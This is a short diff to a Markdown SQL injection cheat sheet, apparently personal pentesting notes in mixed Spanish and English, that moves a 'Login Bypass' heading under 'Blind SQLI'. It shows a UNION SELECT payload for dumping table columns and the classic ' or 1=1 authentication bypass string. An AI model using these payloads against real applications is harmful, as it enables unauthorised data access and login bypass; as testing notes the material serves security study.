@@ -68,13 +68,13 @@ Table dumping
 ```
 UNION SELECT 1,2,group_concat(columna1,':',columna2 SEPARATOR '<br>') FROM nombre_tabla
 ```
-### Login Bypass
+### Blind SQLI
+
+#### Login Bypass
 
 ```
 ' or 1=1 - --
 ```
-### Blind SQLI
-
 #### Boolean Based (poner siempre por defecto 'false')
 
 Database enumeration brute force attack(sin sustituir ninguno de los numeros)
